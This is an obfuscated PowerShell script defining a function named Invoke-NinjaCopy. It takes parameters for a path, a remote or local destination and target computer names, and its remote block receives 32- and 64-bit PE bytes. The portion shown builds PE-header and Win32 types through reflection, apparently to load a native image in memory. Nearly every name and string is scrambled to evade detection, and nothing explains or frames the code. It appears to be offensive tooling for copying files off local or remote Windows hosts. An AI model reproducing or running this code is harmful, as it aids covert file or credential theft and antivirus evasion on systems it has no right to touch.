 $3W78 =[tyPe]("{0}{6}{3}{5}{2}{7}{4}{1}{8}" -F 's','HaLaSAttRi','Ices','rUnTimE.inTe','rS','RopserV','YsTem.','.MA','bUTE') ;  &("{0}{1}" -f'S','Et') ('27'+'lxu') ([typE]("{11}{4}{0}{1}{9}{2}{3}{7}{8}{5}{10}{6}" -f'.','rU','ti','ME.intE','tEM','CEs','MANAgedTYpE','R','OPserVI','N','.UN','Sys') ) ;  $JMgn=[tYpE]("{0}{1}" -f'INT','32') ; &("{1}{0}" -f'eT-itEM','s')  VARIAbLe:B1gF  ( [tYpE]("{1}{0}" -F'oOL','b') ) ;  $c7jF6h =[tYpE]("{1}{0}{3}{2}" -F 'con','BIT','R','verTe')  ;  &("{1}{0}{2}"-f'i','set-vAr','aBLE')  ("Q"+"Y04"+"F7")  ( [tYpE]("{6}{4}{9}{8}{2}{11}{3}{1}{10}{7}{5}{0}" -F 's','MIT.AssEmblYBuILDera','o','E','ySteM.refl','S','S','e','Cti','E','cC','n.') )  ;  $Rz1K4 =  [Type]("{6}{7}{2}{0}{1}{4}{3}{5}{8}"-f 'M.','REfLECT','E','nVEn','IoN.CAlLINGco','t','sys','T','ioNs')  ;  &("{2}{0}{1}"-f't','EM','seT-I')  varIABle:A570w  (  [TyPE]("{1}{0}"-f 'DomaiN','App')); $UXB =[TyPE]("{1}{0}{3}{2}"-F 'IROn','Env','t','MEN') ;  &("{0}{1}{2}"-f'sE','T-it','EM') vaRiAbLE:PIMbt ( [TYpE]("{0}{1}{2}"-F'uiN','t','PtR'));  &("{2}{3}{0}{1}" -f'R','iable','S','eT-Va') ('e1'+'Iz')  ( [TYPe]("{0}{1}"-F'm','ATH')); $V3M =  [TYPe]("{0}{1}"-f'cOnVER','t');&('sV')  ('m28'+'R76')  ([tYPE]("{0}{2}{1}" -F 'u','t32','IN')  ); &("{1}{0}{2}"-f 'iTE','Set-','M') ("vARi"+"ABLe:"+"3"+"5gm2o")  ([TYpE]("{1}{0}" -F 'Nt64','UI')  ) ;  &('sV') 15Y4hs ( [tYPe]("{0}{1}{4}{6}{5}{3}{2}" -F'Sy','sTE','al','e.iNTEROpsERvices.mARSH','m','RuNTIm','.')  ) ;  &('SV')  ("1I"+"2l") ( [typE]("{1}{0}"-F 'PtR','InT')  )  ;   &("{1}{0}" -f 't','Se')  ("h"+"2Pd") ( [TYpE]("{3}{2}{0}{1}"-F 'mo','de','LE','SYsTem.iO.fi'))  ;   &('sv')  S2c9X  ([TYpE]("{3}{2}{1}{4}{0}" -F'OrIgIN','iO.sE','m.','sySte','eK')  )  ;   &("{3}{1}{2}{0}" -f'LE','t-vA','RiaB','Se') ("Md"+"WT") (  [TYPE]('GC') )  ;function I`NvoKe-nINJA`C`OPy
{


[CmdletBinding()]
Param(
	[Parameter(pOsiTIoN = 0, MAnDatoRy = ${tr`UE})]
	[String]
	${Pa`Th},

	[Parameter(poSITioN = 1, pARAMEterseTNaME="R`e`mOTeDesT")]
	[String]
	${RE`mOTeDEStIna`T`iON},

    [Parameter(PoSiTIoN = 1, paRAmetErsETNAmE="LOc`A`ldeST")]
    [String]
    ${loc`ALdeS`TIN`ATI`On},
	
	[Parameter(pOsiTiON = 2)]
	[String[]]
	${c`OMPu`TEr`N`AME},
	
	[Parameter(POsitioN = 3)]
	[UInt32]
	${BU`FfErs`IzE} = 5 * 1024 * 1024
)

&("{3}{4}{0}{2}{1}" -f 'ctM','de','o','Set-St','ri') -Version 2


${REMoTeScri`pT`Bl`oCk} = {
	[CmdletBinding()]
	Param(
		[Parameter(PosiTiOn = 0, maNdAtoRy = ${tr`Ue})]
		[String]
		${Pe`Byte`S32},

        [Parameter(POsitiON = 1, MaNdAtoRy = ${tr`Ue})]
		[String]
		${PEb`Y`TeS64},
		
		[Parameter(posITIOn = 2, MAnDAtORY = ${t`Rue})]
		[String]
		${P`AtH},
		
		[Parameter(poSition = 3)]
		[String]
		${RE`M`OTedeStINa`Ti`oN},
		
		[Parameter(poSiTIoN = 4)]
		[UInt32]
		${b`UFFE`RSiZe},

        [Parameter(POsITIon = 5)]
		[UInt64]
		${FILE`Of`F`Set}
	)
	
	
	
	
	Function GE`T-W`IN32`TypEs
	{
		${wI`N32`TYpES} = &("{0}{1}{2}" -f'Ne','w-Obje','ct') ("{0}{1}{3}{2}"-f 'System','.Ob','t','jec')

		
		
		${d`o`maIn} =  $A570W::"Cu`RrENt`D`OmAIN"
		${D`YN`AMi`ca`sSeMBlY} = &("{2}{1}{0}" -f'ct','Obje','New-') ("{3}{0}{5}{7}{8}{6}{4}{1}{2}" -f 'e','embl','yName','Syst','ss','m.','n.A','R','eflectio')(("{0}{1}{2}{4}{3}" -f 'Dy','n','am','embly','icAss'))
		${aS`s`e`mblYB`UILder} = ${DO`m`Ain}.("{0}{3}{1}{2}{4}"-f'Def','eDy','n','in','amicAssembly').Invoke(${DyNAMI`CAs`SEm`BLY},  ( &("{0}{2}{1}" -f 'gET-c','DItem','hiL') VariAbLe:qy04f7  )."vA`LUE"::"r`Un")
		${mO`DUle`BU`i`Lder} = ${aSS`eMBlY`Bui`LD`er}.("{2}{0}{1}{3}" -f 'Dy','namicModu','Define','le').Invoke(("{4}{0}{1}{2}{3}"-f'ynam','icM','odu','le','D'), ${FAL`se})
		${cONsTru`c`T`Ori`NfO} =  $3w78.("{4}{0}{1}{3}{2}" -f'ru','c','ors','t','GetConst').Invoke()[0]


		
		
		${tY`P`eBUiLder} = ${MO`dU`l`EBuiLdeR}.("{3}{1}{2}{0}" -f'um','efine','En','D').Invoke(("{2}{1}{0}" -f 'hineType','c','Ma'), ("{1}{2}{0}"-f 'ic','Pu','bl'), [UInt16])
		${ty`PEBUI`LD`ER}.("{0}{1}{2}{4}{3}" -f 'Defi','ne','Li','l','tera').Invoke(("{0}{1}"-f'Nati','ve'), [UInt16] 0) | &("{2}{0}{1}"-f'u','ll','Out-N')
		${t`YpE`BUiL`DER}.("{1}{0}{3}{2}"-f 'fineLite','De','al','r').Invoke(("{1}{0}" -f'386','I'), [UInt16] 0x014c) | &("{2}{1}{0}" -f '-Null','ut','O')
		${Type`B`Uild`er}.("{4}{3}{2}{0}{1}" -f'a','l','Liter','fine','De').Invoke(("{0}{1}"-f'Itani','um'), [UInt16] 0x0200) | &("{0}{1}{2}"-f'Out-Nu','l','l')
		${tY`peBUIL`deR}."DEfiNELI`Te`RAL"('x64', [UInt16] 0x8664) | &("{0}{1}" -f'Out-N','ull')
		${m`AchiN`et`ypE} = ${TY`peb`Ui`lDer}.("{0}{2}{3}{1}" -f'Cre','e','a','teTyp').Invoke()
		${Wi`N32`Ty`pES} | &("{0}{2}{1}"-f 'A','r','dd-Membe') -MemberType ("{3}{0}{1}{2}"-f 'ePrope','r','ty','Not') -Name ("{2}{1}{3}{0}"-f 'Type','chi','Ma','ne') -Value ${MAC`hinE`TY`pE}

		
		${tyP`eB`UI`LDeR} = ${moD`U`LEbU`IL`Der}.("{1}{0}{2}"-f 'fineEn','De','um').Invoke(("{1}{0}{2}"-f'gicTy','Ma','pe'), ("{0}{1}"-f 'P','ublic'), [UInt16])
		${TyP`e`BUi`lDeR}.("{0}{2}{4}{3}{1}"-f'De','l','f','neLitera','i').Invoke(("{4}{5}{1}{2}{6}{0}{3}" -f 'GI','AL_HD','R32','C','IMAGE_N','T_OPTION','_MA'), [UInt16] 0x10b) | &("{2}{0}{1}"-f 'ut','-Null','O')
		${Ty`PEBuiL`deR}.("{0}{1}{2}" -f 'Define','L','iteral').Invoke(("{1}{5}{4}{6}{0}{3}{2}" -f'DR64_MA','IMA','C','GI','T_OPTION','GE_N','AL_H'), [UInt16] 0x20b) | &("{2}{0}{1}" -f 'l','l','Out-Nu')
		${Ma`gICT`YpE} = ${tYpEbu`iL`DER}.("{2}{1}{0}" -f'pe','reateTy','C').Invoke()
		${win32TY`P`es} | &("{2}{1}{0}"-f'r','be','Add-Mem') -MemberType ("{0}{1}{2}{3}" -f'NotePrope','r','t','y') -Name ("{0}{1}{2}"-f'Ma','gi','cType') -Value ${mAgic`TY`Pe}

		
		${TY`PeBU`Ilder} = ${MoDUlEBU`iL`D`ER}.("{1}{2}{0}" -f 'um','Define','En').Invoke(("{2}{0}{1}"-f'bSyste','mType','Su'), ("{1}{0}" -f'lic','Pub'), [UInt16])
		${T`Yp`EBuILD`er}.("{0}{3}{1}{4}{2}"-f'D','f','eLiteral','e','in').Invoke(("{3}{0}{2}{4}{1}"-f 'E_','_UNKNOWN','SUBSY','IMAG','STEM'), [UInt16] 0) | &("{2}{0}{1}" -f'ut-Nu','ll','O')
		${Ty`pEbuIl`dER}.("{0}{2}{1}{3}{4}"-f'Defin','t','eLi','e','ral').Invoke(("{0}{4}{3}{1}{2}"-f 'IM','M_N','ATIVE','E','AGE_SUBSYST'), [UInt16] 1) | &("{0}{2}{1}" -f 'Out','Null','-')
		${ty`pE`BuilD`eR}.("{2}{0}{1}"-f'fineLi','teral','De').Invoke(("{2}{3}{0}{1}{6}{5}{7}{8}{4}"-f 'YST','E','IMA','GE_SUBS','I','IN','M_W','DOWS','_GU'), [UInt16] 2) | &("{1}{2}{0}"-f'l','Ou','t-Nul')
		${tyP`eBUil`deR}.("{1}{0}{2}{3}"-f 'e','D','fineLiter','al').Invoke(("{1}{4}{5}{3}{2}{0}"-f 'WINDOWS_CUI','IMA','STEM_','Y','GE_SUB','S'), [UInt16] 3) | &("{0}{1}"-f'O','ut-Null')
		${TYpeb`UIL`D`Er}.("{3}{2}{1}{0}" -f'ineLiteral','f','e','D').Invoke(("{1}{2}{4}{3}{0}" -f'_CUI','IMAGE_SUBSYST','EM','IX','_POS'), [UInt16] 7) | &("{0}{1}" -f 'O','ut-Null')
		${T`YpeB`U`ILDer}.("{0}{2}{1}" -f'Defi','eral','neLit').Invoke(("{0}{2}{4}{3}{1}" -f'IMAGE_SU','_GUI','BSYSTEM','OWS_CE','_WIND'), [UInt16] 9) | &("{2}{1}{0}"-f 'Null','t-','Ou')
		${T`YpEBUILD`eR}.("{1}{2}{0}"-f 'l','DefineLiter','a').Invoke(("{3}{5}{6}{4}{1}{0}{2}" -f'A','M_EFI_','PPLICATION','IM','SYSTE','AGE','_SUB'), [UInt16] 10) | &("{0}{1}"-f'Out-Nu','ll')
		${TyPEB`U`i`LdER}.("{1}{3}{0}{2}"-f 'ter','De','al','fineLi').Invoke(("{0}{9}{2}{4}{3}{1}{11}{10}{8}{5}{7}{6}" -f 'IM','EM','_SUB','T','SYS','E','DRIVER','_','_BOOT_SERVIC','AGE','EFI','_'), [UInt16] 11) | &("{1}{2}{0}" -f'll','Out-N','u')
		${TYPe`BUIl`d`er}.("{0}{2}{1}"-f'D','neLiteral','efi').Invoke(("{0}{5}{6}{1}{4}{3}{7}{2}"-f'IMAGE_SU','EM_E','VER','_RUN','FI','BS','YST','TIME_DRI'), [UInt16] 12) | &("{1}{0}"-f'ull','Out-N')
		${tYPEb`UI`L`DeR}.("{0}{3}{2}{4}{1}" -f'De','l','ineLit','f','era').Invoke(("{4}{3}{1}{5}{2}{0}" -f'ROM','GE','YSTEM_EFI_','MA','I','_SUBS'), [UInt16] 13) | &("{1}{0}" -f'ut-Null','O')
		${TY`PE`Build`Er}.("{1}{0}{2}"-f'efine','D','Literal').Invoke(("{3}{5}{2}{4}{0}{1}" -f '_XB','OX','BSYST','IMAG','EM','E_SU'), [UInt16] 14) | &("{0}{2}{1}"-f 'Ou','ull','t-N')
		${Su`Bs`YSt`eMTypE} = ${Ty`PEb`UIldeR}.("{2}{1}{0}" -f'ateType','re','C').Invoke()
		${wi`N32T`yPES} | &("{1}{0}{2}" -f'b','Add-Mem','er') -MemberType ("{3}{2}{1}{0}"-f 'y','ePropert','ot','N') -Name ("{0}{1}{2}"-f'S','ubS','ystemType') -Value ${sUBsyST`EMt`Y`pE}

		
		${T`YpebUI`lDer} = ${Mod`Ul`E`BuiLder}.("{2}{0}{3}{1}" -f'ne','m','Defi','Enu').Invoke(("{4}{2}{0}{3}{1}"-f'lCharac','Type','l','teristics','D'), ("{1}{0}{2}"-f 'bli','Pu','c'), [UInt16])
		${T`YpEbuil`dEr}.("{2}{3}{0}{1}" -f'ter','al','Defi','neLi').Invoke(("{0}{1}" -f'RE','S_0'), [UInt16] 0x0001) | &("{1}{2}{0}"-f 'll','Out-','Nu')
		${tYPEbui`ld`er}.("{2}{0}{1}" -f 'neL','iteral','Defi').Invoke(("{0}{1}"-f'RE','S_1'), [UInt16] 0x0002) | &("{2}{0}{1}"-f'ut-','Null','O')
		${TYP`eBu`ILd`ER}.("{2}{3}{1}{0}"-f'neLiteral','i','De','f').Invoke(("{0}{1}" -f 'RES_','2'), [UInt16] 0x0004) | &("{1}{0}{2}" -f'-Nu','Out','ll')
		${Type`B`UiLdEr}.("{1}{3}{4}{0}{2}"-f 'i','Defi','teral','ne','L').Invoke(("{1}{0}"-f 'ES_3','R'), [UInt16] 0x0008) | &("{1}{2}{0}" -f 'l','Out','-Nul')
		${TYpe`BuiL`D`Er}.("{3}{0}{4}{2}{1}"-f 'fi','al','Liter','De','ne').Invoke(("{4}{0}{6}{1}{3}{5}{2}" -f '_DLL','ARACTER','MIC_BASE','ISTICS_D','IMAGE','YNA','_CH'), [UInt16] 0x0040) | &("{2}{1}{0}"-f't-Null','u','O')
		${t`YPeBUIld`Er}.("{2}{0}{1}"-f'era','l','DefineLit').Invoke(("{1}{8}{6}{4}{5}{0}{7}{2}{3}" -f 'RC','IMAGE_D','EGRI','TY','CTERI','STICS_FO','A','E_INT','LL_CHAR'), [UInt16] 0x0080) | &("{1}{0}{2}"-f 'u','O','t-Null')
		${tYPE`B`UilD`Er}.("{0}{1}{2}" -f 'D','efineL','iteral').Invoke(("{2}{1}{6}{0}{10}{4}{8}{9}{3}{7}{5}" -f'C','AGE_D','IM','ICS_NX','CTE','OMPAT','LL_','_C','R','IST','HARA'), [UInt16] 0x0100) | &("{1}{0}{2}"-f 'ut-','O','Null')
		${TYPE`BuiL`D`eR}.("{2}{1}{0}" -f 'neLiteral','efi','D').Invoke(("{3}{8}{9}{0}{1}{6}{5}{2}{10}{7}{4}"-f'CHARA','CT','CS_','IMAGE','SOLATION','STI','ERI','I','_DL','L','NO_'), [UInt16] 0x0200) | &("{2}{0}{1}"-f 'Nul','l','Out-')
		${tyP`eBu`ILDER}.("{2}{1}{4}{3}{0}" -f 'al','neLi','Defi','r','te').Invoke(("{5}{6}{3}{0}{1}{7}{2}{4}"-f'H','ARA','_N','GE_DLLC','O_SEH','I','MA','CTERISTICS'), [UInt16] 0x0400) | &("{1}{0}"-f 'l','Out-Nul')
		${tYpE`B`UildEr}.("{2}{0}{1}" -f'ne','Literal','Defi').Invoke(("{0}{6}{7}{3}{5}{4}{2}{1}" -f'IMAG','D','N','CT','_BI','ERISTICS_NO','E_DLLCHAR','A'), [UInt16] 0x0800) | &("{1}{0}"-f 't-Null','Ou')
		${T`yPeb`UIl`deR}.("{3}{0}{4}{2}{1}"-f 'efi','ral','Lite','D','ne').Invoke(("{1}{0}" -f'4','RES_'), [UInt16] 0x1000) | &("{0}{1}" -f'Out','-Null')
		${TY`PEBU`ilD`ER}.("{2}{3}{1}{0}" -f 'al','iter','Def','ineL').Invoke(("{3}{5}{2}{6}{4}{1}{7}{0}" -f 'VER','ERISTICS_WDM_','DLLCHAR','IM','CT','AGE_','A','DRI'), [UInt16] 0x2000) | &("{0}{1}" -f 'Out-Nul','l')
		${t`YPeBuI`L`der}.("{2}{0}{1}"-f 'ra','l','DefineLite').Invoke(("{9}{5}{2}{7}{3}{8}{0}{6}{1}{4}"-f'RMINAL_SE','R_','AR','ISTICS','AWARE','CH','RVE','ACTER','_TE','IMAGE_DLL'), [UInt16] 0x8000) | &("{1}{0}{2}" -f't','Ou','-Null')
		${dllcHa`RAc`TE`RISTI`Cs`TYpE} = ${Ty`peBuIl`D`Er}.("{1}{0}{2}" -f 'reateTy','C','pe').Invoke()
		${wIn32ty`P`ES} | &("{1}{2}{0}"-f'ber','Add-M','em') -MemberType ("{1}{0}{2}" -f'P','Note','roperty') -Name ("{5}{6}{2}{0}{3}{1}{4}"-f'ri','ticsTy','cte','s','pe','Dl','lChara') -Value ${dl`lch`ARAc`TERI`sTiCStYpE}

		
		
		${AT`TRiBu`TeS} = ("{2}{12}{10}{15}{1}{9}{13}{3}{14}{6}{7}{11}{0}{4}{8}{5}"-f'i','out,','A',', Public, ExplicitLay','e','dInit','le','d','l',' AnsiClass, Cl','oLa',', BeforeF','ut','ass','out, Sea','y')
		${TYP`Ebuil`dER} = ${mO`dULe`B`UILDER}.("{2}{0}{1}{3}" -f 'ef','in','D','eType').Invoke(("{1}{3}{0}{2}{4}"-f'_DATA','IMAG','_','E','DIRECTORY'), ${at`T`RibuteS}, [System.ValueType], 8)
		(${typ`eB`UIL`DeR}.("{2}{0}{1}" -f 'efineF','ield','D').Invoke(("{4}{1}{2}{3}{0}"-f'ss','u','alAddr','e','Virt'), [UInt32], ("{1}{0}"-f'c','Publi'))).("{1}{0}{3}{2}" -f'Offs','Set','t','e').Invoke(0) | &("{2}{1}{0}" -f 'l','Nul','Out-')
		(${T`yPeBU`i`LdeR}.("{1}{0}{3}{2}" -f 'ne','Defi','d','Fiel').Invoke(("{1}{0}"-f'e','Siz'), [UInt32], ("{1}{0}" -f'ublic','P'))).("{0}{2}{1}"-f'Set','t','Offse').Invoke(4) | &("{1}{0}{2}"-f 'Nu','Out-','ll')
		${I`MAgE_dA`Ta_diR`eCtO`RY} = ${T`YPe`BUiLd`eR}.("{0}{2}{1}" -f'Cr','pe','eateTy').Invoke()
		${win`32`TyP`Es} | &("{2}{0}{1}" -f '-Memb','er','Add') -MemberType ("{1}{3}{2}{0}" -f'erty','N','teProp','o') -Name ("{0}{1}{3}{2}" -f'IMAGE_DATA_D','IREC','RY','TO') -Value ${ima`GE`_dAta_DiRecT`O`Ry}

		
		${A`TT`Ri`BUtes} = ("{7}{13}{1}{5}{8}{11}{6}{9}{12}{14}{10}{0}{4}{2}{3}" -f 'eforeFiel',', AnsiClass,','i','t','dIn',' Class, Pub','quentialL','AutoLayou','lic','ayout, Se','d, B',', Se','al','t','e')
		${TYp`EBuI`lD`er} = ${MOdulEB`UI`LdER}.("{3}{1}{2}{0}" -f 'e','efi','neTyp','D').Invoke(("{4}{3}{2}{0}{1}" -f'E','R','D','AGE_FILE_HEA','IM'), ${A`T`Tr`ibUtES}, [System.ValueType], 20)
		${TY`PE`BU`ildEr}.("{1}{2}{0}"-f'Field','Def','ine').Invoke(("{0}{1}"-f 'Mach','ine'), [UInt16], ("{0}{1}"-f 'Publi','c')) | &("{0}{1}{2}"-f'Out-','Nu','ll')
		${ty`PebU`IlDer}.("{0}{2}{3}{1}" -f'D','eld','e','fineFi').Invoke(("{0}{2}{4}{3}{1}" -f 'N','ions','u','OfSect','mber'), [UInt16], ("{0}{1}" -f 'Publ','ic')) | &("{1}{0}" -f'll','Out-Nu')
		${tyPEbu`I`ldeR}.("{3}{2}{1}{0}" -f 'd','el','ineFi','Def').Invoke(("{2}{3}{4}{1}{0}"-f'p','tam','Ti','meDat','eS'), [UInt32], ("{0}{2}{1}"-f 'Pub','c','li')) | &("{0}{1}{2}"-f 'Ou','t','-Null')
		${TYpeBui`l`dER}.("{3}{0}{1}{2}" -f'in','e','Field','Def').Invoke(("{1}{2}{3}{4}{0}"-f 'e','Po','inter','To','SymbolTabl'), [UInt32], ("{0}{1}" -f 'Publi','c')) | &("{2}{0}{1}"-f 'Nu','ll','Out-')
		${tYPeBU`i`lDER}.("{3}{1}{2}{0}" -f'ld','fin','eFie','De').Invoke(("{3}{1}{2}{0}"-f 'ols','erOfSym','b','Numb'), [UInt32], ("{0}{1}"-f 'Publi','c')) | &("{0}{2}{1}"-f'Out-N','l','ul')
		${typeb`U`ILdER}.("{2}{0}{1}" -f'iel','d','DefineF').Invoke(("{3}{0}{2}{5}{1}{4}"-f 'zeOfO','a','p','Si','der','tionalHe'), [UInt16], ("{1}{0}{2}" -f 'l','Pub','ic')) | &("{2}{1}{0}"-f 'ull','ut-N','O')
		${TYp`eb`U`iLDer}.("{3}{0}{1}{2}" -f 'efine','Fiel','d','D').Invoke(("{0}{1}{3}{4}{2}"-f 'Cha','rac','cs','ter','isti'), [UInt16], ("{0}{1}" -f 'P','ublic')) | &("{2}{0}{1}"-f 'ut-N','ull','O')
		${I`mAge`_FIL`e`_`heADEr} = ${T`yPEB`UIlDER}.("{0}{3}{1}{2}"-f 'C','ea','teType','r').Invoke()
		${w`In3`2TyPEs} | &("{1}{0}{2}"-f'-Mem','Add','ber') -MemberType ("{2}{1}{0}" -f 'y','otePropert','N') -Name ("{0}{3}{2}{1}"-f 'IMA','_HEADER','E','GE_FIL') -Value ${iM`A`Ge_fIL`E_HEA`DER}

		
		${aT`TriB`UT`Es} = ("{6}{1}{10}{9}{7}{0}{3}{12}{11}{8}{5}{4}{2}" -f', Cl','yo','t','a','ni',', Sealed, BeforeFieldI','AutoLa','ass','citLayout','siCl','ut, An','blic, Expli','ss, Pu')
		${T`yP`ebu`ILDER} = ${m`O`DULE`BUiLdeR}.("{0}{2}{1}"-f 'D','ype','efineT').Invoke(("{1}{0}{3}{2}"-f'TION','IMAGE_OP','HEADER64','AL_'), ${aTt`R`i`BUTeS}, [System.ValueType], 240)
		(${TyPe`BUi`lder}.("{1}{2}{0}"-f'd','Define','Fiel').Invoke(("{0}{1}" -f 'Mag','ic'), ${maG`I`CT`ype}, ("{1}{0}"-f 'blic','Pu'))).("{0}{2}{1}"-f 'SetOf','t','fse').Invoke(0) | &("{1}{0}"-f '-Null','Out')
		(${typEBUIl`d`eR}.("{2}{1}{3}{0}" -f'ield','e','D','fineF').Invoke(("{4}{0}{1}{3}{2}" -f 'jorLinke','rVer','ion','s','Ma'), [Byte], ("{0}{1}" -f 'Pub','lic'))).("{0}{1}{2}"-f 'Se','tOff','set').Invoke(2) | &("{1}{0}{2}"-f 't-Nul','Ou','l')
		(${TY`p`Eb`UildeR}.("{0}{2}{1}" -f'De','eld','fineFi').Invoke(("{4}{1}{3}{2}{0}" -f 'n','erV','io','ers','MinorLink'), [Byte], ("{2}{1}{0}" -f 'blic','u','P'))).("{1}{0}{2}{3}" -f 'tOff','Se','se','t').Invoke(3) | &("{0}{1}"-f'Out-N','ull')
		(${t`yPE`B`UilDER}.("{0}{2}{1}"-f'DefineFie','d','l').Invoke(("{2}{3}{0}{1}" -f'o','de','Siz','eOfC'), [UInt32], ("{0}{1}{2}" -f'Pu','bli','c'))).("{0}{1}{2}" -f'Se','tOffse','t').Invoke(4) | &("{1}{0}"-f 'Null','Out-')
		(${TYpeb`U`iLDer}.("{0}{2}{1}" -f 'Def','Field','ine').Invoke(("{5}{3}{0}{4}{2}{1}{6}" -f'ti','at','dD','izeOfIni','alize','S','a'), [UInt32], ("{1}{0}"-f 'ic','Publ'))).("{0}{1}{2}"-f 'Se','tOffs','et').Invoke(8) | &("{2}{0}{1}" -f 'l','l','Out-Nu')
		(${TY`PeBU`ilDeR}.("{1}{2}{0}" -f'ield','D','efineF').Invoke(("{4}{1}{2}{3}{0}"-f 'zedData','ni','tial','i','SizeOfUni'), [UInt32], ("{1}{0}" -f'blic','Pu'))).("{0}{1}{2}" -f 'S','etOf','fset').Invoke(12) | &("{0}{1}{2}"-f 'Out-N','u','ll')
		(${Type`BUIL`DER}.("{2}{0}{1}" -f'eFi','eld','Defin').Invoke(("{0}{2}{1}{3}{4}" -f 'Addre','n','ssOfE','try','Point'), [UInt32], ("{1}{0}"-f 'ic','Publ'))).("{2}{0}{1}"-f 'etOffse','t','S').Invoke(16) | &("{2}{1}{0}"-f 'll','u','Out-N')
		(${TYPeb`UI`l`deR}.("{0}{1}{2}"-f 'DefineF','iel','d').Invoke(("{0}{2}{1}"-f'BaseOf','de','Co'), [UInt32], ("{0}{1}"-f'P','ublic'))).("{2}{1}{0}"-f 'set','f','SetOf').Invoke(20) | &("{0}{2}{1}" -f 'O','-Null','ut')
		(${t`yp`EBuIL`der}.("{0}{1}{2}{3}" -f'Defi','n','eFiel','d').Invoke(("{0}{1}{2}"-f'I','m','ageBase'), [UInt64], ("{1}{2}{0}" -f'ic','P','ubl'))).("{1}{0}{2}" -f'tOffs','Se','et').Invoke(24) | &("{0}{1}{2}" -f 'O','ut-Nu','ll')
		(${TY`PEbuilD`eR}.("{0}{1}{3}{2}"-f 'D','efin','eld','eFi').Invoke(("{3}{4}{0}{1}{2}"-f'tionA','lig','nment','Se','c'), [UInt32], ("{0}{1}{2}" -f 'P','ub','lic'))).("{1}{2}{0}" -f'set','S','etOff').Invoke(32) | &("{2}{0}{1}" -f'-Nul','l','Out')
		(${TYpe`Bu`iL`DeR}.("{1}{2}{0}{3}" -f 'i','Def','ineF','eld').Invoke(("{2}{1}{3}{0}" -f 't','gnme','FileAli','n'), [UInt32], ("{0}{1}" -f 'Pu','blic'))).("{1}{0}{2}" -f'etOffse','S','t').Invoke(36) | &("{1}{0}{2}" -f '-Nul','Out','l')
		(${TY`pe`B`UiLdEr}.("{3}{2}{1}{0}"-f 'Field','ne','fi','De').Invoke(("{4}{2}{1}{0}{3}{5}"-f 'n','ti','orOpera','gSystemVersi','Maj','on'), [UInt16], ("{0}{1}{2}" -f 'P','ubl','ic'))).("{1}{2}{0}" -f 't','SetOff','se').Invoke(40) | &("{2}{0}{1}"-f 'u','ll','Out-N')
		(${tY`peB`U`iLdeR}.("{0}{2}{1}" -f 'D','eld','efineFi').Invoke(("{2}{0}{4}{3}{6}{5}{1}"-f'era','on','MinorOp','ngSyste','ti','rsi','mVe'), [UInt16], ("{0}{1}" -f'Publi','c'))).("{2}{1}{0}" -f 'et','ffs','SetO').Invoke(42) | &("{1}{0}" -f'ut-Null','O')
		(${T`y`PE`BuilDeR}.("{1}{0}{2}"-f'efin','D','eField').Invoke(("{2}{1}{4}{0}{3}"-f'rsio','orImageV','Maj','n','e'), [UInt16], ("{0}{2}{1}" -f'P','c','ubli'))).("{2}{1}{0}" -f 'fset','Of','Set').Invoke(44) | &("{2}{0}{1}"-f 'ul','l','Out-N')
		(${TypEb`UI`lder}.("{2}{1}{0}" -f'ield','neF','Defi').Invoke(("{4}{2}{1}{3}{5}{0}"-f 'on','mag','rI','e','Mino','Versi'), [UInt16], ("{2}{0}{1}"-f'ubl','ic','P'))).("{0}{1}{2}"-f 'Se','tOff','set').Invoke(46) | &("{2}{1}{0}" -f 'Null','t-','Ou')
		(${T`yP`eBU`iLdER}.("{0}{1}{2}"-f'Defin','eFiel','d').Invoke(("{4}{2}{1}{0}{3}" -f 'stemVersio','rSubsy','o','n','Maj'), [UInt16], ("{1}{2}{0}" -f'ic','Pu','bl'))).("{1}{0}{2}"-f 'tOffse','Se','t').Invoke(48) | &("{0}{1}{2}"-f 'Out-','Nu','ll')
		(${Typ`E`BuIlDer}.("{2}{1}{0}" -f'fineField','e','D').Invoke(("{2}{5}{0}{3}{1}{4}"-f 'emVe','o','Minor','rsi','n','Subsyst'), [UInt16], ("{0}{1}" -f'Pu','blic'))).("{0}{1}" -f'SetOffs','et').Invoke(50) | &("{0}{1}{2}"-f'Out','-Nu','ll')
		(${TyP`EbUI`Ld`eR}.("{0}{2}{1}{3}" -f 'Defi','iel','neF','d').Invoke(("{1}{2}{4}{0}{3}{5}" -f 'on','Win32Ve','r','Valu','si','e'), [UInt32], ("{0}{1}" -f 'Pub','lic'))).("{2}{0}{1}"-f 'f','fset','SetO').Invoke(52) | &("{2}{0}{1}"-f'ut-Nul','l','O')
		(${TY`pe`B`UiLdeR}.("{0}{1}{3}{2}" -f'De','fineFi','d','el').Invoke(("{1}{2}{3}{0}"-f 'e','Siz','eOfIma','g'), [UInt32], ("{1}{0}" -f'c','Publi'))).("{1}{2}{0}"-f'ffset','Se','tO').Invoke(56) | &("{0}{1}"-f'Out-Nul','l')
		(${T`yp`eBUIld`Er}.("{1}{2}{0}" -f'ld','Define','Fie').Invoke(("{2}{1}{3}{0}" -f 'rs','e','Siz','OfHeade'), [UInt32], ("{0}{1}" -f 'Publi','c'))).("{0}{1}{2}"-f 'Set','Off','set').Invoke(60) | &("{1}{2}{0}"-f 'll','Out-','Nu')
		(${tyPeBU`i`ldEr}.("{1}{0}{3}{2}" -f 'ne','Defi','ld','Fie').Invoke(("{2}{0}{1}" -f 'ck','Sum','Che'), [UInt32], ("{1}{0}" -f 'c','Publi'))).("{0}{2}{1}"-f'S','t','etOffse').Invoke(64) | &("{2}{0}{1}" -f't-Nul','l','Ou')
		(${t`Yp`eBu`ILDEr}.("{2}{0}{1}" -f 'eFiel','d','Defin').Invoke(("{1}{0}{2}"-f'ubsys','S','tem'), ${s`UBSY`StEMT`y`pE}, ("{0}{1}"-f 'P','ublic'))).("{2}{0}{1}" -f'ffse','t','SetO').Invoke(68) | &("{1}{2}{0}"-f '-Null','Ou','t')
		(${t`yPeb`UIL`deR}.("{0}{2}{1}{3}"-f'D','fi','e','neField').Invoke(("{0}{4}{2}{1}{3}" -f'DllCh','terist','c','ics','ara'), ${DLl`cHaRac`T`eRiSTicSt`y`pe}, ("{1}{0}" -f'blic','Pu'))).("{2}{1}{0}"-f 't','se','SetOff').Invoke(70) | &("{1}{0}" -f 'ull','Out-N')
		(${Ty`P`EB`UILDer}.("{2}{3}{0}{1}"-f'i','eld','Def','ineF').Invoke(("{0}{4}{1}{3}{2}"-f'Siz','OfS','ckReserve','ta','e'), [UInt64], ("{1}{0}"-f 'ublic','P'))).("{1}{0}{2}"-f'etOf','S','fset').Invoke(72) | &("{0}{1}{2}"-f 'O','ut','-Null')
